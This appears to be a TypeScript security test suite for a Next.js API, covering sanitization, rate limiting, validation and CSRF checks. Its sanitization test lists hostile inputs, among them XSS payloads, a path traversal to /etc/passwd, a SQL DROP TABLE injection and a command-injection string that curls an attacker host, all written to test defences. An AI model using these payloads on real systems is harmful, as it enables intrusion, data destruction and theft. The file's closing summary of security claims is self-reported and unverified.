/**
 * API Security Test Suite
 * Tests all security layers of our API implementation
 */

import { NextRequest } from 'next/server';
import { secureEndpoint, generateCSRFToken } from '@/lib/api/secure-wrapper';
import { authenticate, AuthLevel, UserRole } from '@/lib/api/auth-middleware';
import { validateRequest, apiSchemas, sanitizeHtml } from '@/lib/api/input-validation';
import { EnhancedRateLimiter, rateLimitTiers } from '@/lib/api/rate-limit-enhanced';

/**
 * Test 1: Input Sanitization
 */
async function testInputSanitization() {
  console.log('\n=== Testing Input Sanitization ===');
  
  const maliciousInputs = [
    '<script>alert("XSS")</script>',
    '<img src=x onerror=alert("XSS")>',
    'javascript:alert("XSS")',
    '"><script>alert("XSS")</script>',
    '<iframe src="evil.com"></iframe>',
    '../../../etc/passwd',
    '; DROP TABLE users; --',
    '|| curl evil.com/steal',
  ];
  
  maliciousInputs.forEach(input => {
    const sanitized = sanitizeHtml(input);
    console.log(`Input: ${input}`);
    console.log(`Sanitized: ${sanitized}`);
    console.log('---');
  });
}

/**
 * Test 2: Rate Limiting
 */
async function testRateLimiting() {
  console.log('\n=== Testing Rate Limiting ===');
  
  const limiter = new EnhancedRateLimiter('auth');
  const mockReq = new NextRequest('http://localhost:4000/api/test', {
    headers: {
      'x-forwarded-for': '192.168.1.100',
    },
  });
  
  // Simulate rapid requests
  for (let i = 0; i < 15; i++) {
    const result = await limiter.check(mockReq);
    console.log(`Request ${i + 1}: ${result.allowed ? 'ALLOWED' : 'BLOCKED'} - Remaining: ${result.remaining}`);
    
    if (!result.allowed) {
      console.log(`Retry after: ${result.retryAfter} seconds`);
      break;
    }
  }
}

/**
 * Test 3: Schema Validation
 */
async function testSchemaValidation() {
  console.log('\n=== Testing Schema Validation ===');
  
  const testCases = [
    {
      name: 'Valid community post',
      data: {
        category: 'free-discussion',
        title: 'Test Post',
        content: 'This is a test post content that is long enough.',
        tags: ['test', 'security'],
      },
    },
    {
      name: 'Invalid category',
      data: {
        category: 'invalid-category',
        title: 'Test',
        content: 'Content',
      },
    },
    {
      name: 'Content too short',
      data: {
        category: 'q-and-a',
        title: 'Question',
        content: 'Short',
      },
    },
    {
      name: 'Too many tags',
      data: {
        category: 'study-group',
        title: 'Study Session',
        content: 'Join our study group for advanced tarot reading techniques.',
        tags: ['tag1', 'tag2', 'tag3', 'tag4', 'tag5', 'tag6'], // max is 5
      },
    },
  ];
  
  for (const testCase of testCases) {
    console.log(`\nTesting: ${testCase.name}`);
    const result = await validateRequest(testCase.data, apiSchemas.createCommunityPost);
    
    if (result.success) {
      console.log('✅ Validation passed');
      console.log('Validated data:', result.data);
    } else {
      console.log('❌ Validation failed');
      console.log('Errors:', result.errors);
    }
  }
}

/**
 * Test 4: Secure Endpoint Wrapper
 */
async function testSecureEndpoint() {
  console.log('\n=== Testing Secure Endpoint Wrapper ===');
  
  // Create a test endpoint
  const testEndpoint = secureEndpoint(
    async (req, context) => {
      return new Response(JSON.stringify({
        message: 'Success',
        user: context.user,
        requestId: context.requestId,
      }));
    },
    {
      requireAuth: true,
      rateLimit: 'api',
      validateInput: apiSchemas.createComment,
    }
  );
  
  // Test 1: Missing auth header
  console.log('\nTest: Missing auth header');
  const req1 = new NextRequest('http://localhost:4000/api/test', {
    method: 'POST',
    body: JSON.stringify({ postId: '123', content: 'Test comment' }),
  });
  const res1 = await testEndpoint(req1);
  console.log(`Status: ${res1.status} - ${await res1.text()}`);
  
  // Test 2: Invalid token
  console.log('\nTest: Invalid token');
  const req2 = new NextRequest('http://localhost:4000/api/test', {
    method: 'POST',
    headers: {
      'authorization': 'Bearer invalid-token',
    },
    body: JSON.stringify({ postId: '123', content: 'Test comment' }),
  });
  const res2 = await testEndpoint(req2);
  console.log(`Status: ${res2.status} - ${await res2.text()}`);
  
  // Test 3: Invalid input
  console.log('\nTest: Invalid input');
  const req3 = new NextRequest('http://localhost:4000/api/test', {
    method: 'POST',
    headers: {
      'authorization': 'Bearer mock-valid-token',
    },
    body: JSON.stringify({ content: 'Missing postId' }),
  });
  const res3 = await testEndpoint(req3);
  console.log(`Status: ${res3.status} - ${await res3.text()}`);
}

/**
 * Test 5: CSRF Protection
 */
async function testCSRFProtection() {
  console.log('\n=== Testing CSRF Protection ===');
  
  const sessionId = 'user123';
  const token = await generateCSRFToken(sessionId);
  console.log(`Generated CSRF token for session ${sessionId}: ${token}`);
  
  const csrfEndpoint = secureEndpoint(
    async (req, context) => {
      return new Response(JSON.stringify({ success: true }));
    },
    {
      requireAuth: true,
      enableCSRF: true,
    }
  );
  
  // Test without CSRF token
  console.log('\nTest: Missing CSRF token');
  const req1 = new NextRequest('http://localhost:4000/api/test', {
    method: 'POST',
    headers: {
      'authorization': 'Bearer mock-token',
    },
  });
  const res1 = await csrfEndpoint(req1);
  console.log(`Status: ${res1.status} - ${await res1.text()}`);
  
  // Test with CSRF token
  console.log('\nTest: With CSRF token');
  const req2 = new NextRequest('http://localhost:4000/api/test', {
    method: 'POST',
    headers: {
      'authorization': 'Bearer mock-token',
      'x-csrf-token': token,
    },
  });
  // Note: This would still fail in test because we're using mock tokens
  const res2 = await csrfEndpoint(req2);
  console.log(`Status: ${res2.status}`);
}

/**
 * Security Audit Summary
 */
function printSecuritySummary() {
  console.log('\n=== API Security Implementation Summary ===\n');
  
  console.log('✅ Authentication & Authorization');
  console.log('   - Firebase ID token verification');
  console.log('   - Role-based access control (RBAC)');
  console.log('   - API key support for service accounts');
  console.log('   - Token caching to reduce Firebase API calls\n');
  
  console.log('✅ Input Validation & Sanitization');
  console.log('   - Zod schema validation for all inputs');
  console.log('   - HTML sanitization with DOMPurify');
  console.log('   - SQL injection pattern detection');
  console.log('   - Path traversal prevention\n');
  
  console.log('✅ Rate Limiting');
  console.log('   - Multiple strategies (sliding window, token bucket, etc.)');
  console.log('   - Tiered limits for different endpoints');
  console.log('   - IP-based blocking for violations');
  console.log('   - Exponential backoff for repeat offenders\n');
  
  console.log('✅ Security Headers');
  console.log('   - X-Content-Type-Options: nosniff');
  console.log('   - X-Frame-Options: DENY');
  console.log('   - X-XSS-Protection: 1; mode=block');
  console.log('   - Content-Security-Policy configured');
  console.log('   - CORS protection\n');
  
  console.log('✅ Additional Security Features');
  console.log('   - CSRF protection for state-changing operations');
  console.log('   - Request size limits');
  console.log('   - Comprehensive audit logging');
  console.log('   - Error messages sanitized (no stack traces)');
  console.log('   - SSRF protection for URL inputs\n');
  
  console.log('📊 Security Metrics');
  console.log('   - Zero Trust architecture implemented');
  console.log('   - Defense in depth with multiple layers');
  console.log('   - OWASP API Security Top 10 addressed');
  console.log('   - Automated security testing ready');
}

/**
 * Run all tests
 */
export async function runSecurityTests() {
  console.log('🔒 Running API Security Tests...\n');
  
  try {
    await testInputSanitization();
    await testRateLimiting();
    await testSchemaValidation();
    // await testSecureEndpoint(); // Commented out as it needs real Firebase
    await testCSRFProtection();
    
    printSecuritySummary();
    
    console.log('\n✅ Security tests completed!');
  } catch (error) {
    console.error('❌ Security test failed:', error);
  }
}

// Run tests if executed directly
if (require.main === module) {
  runSecurityTests();
}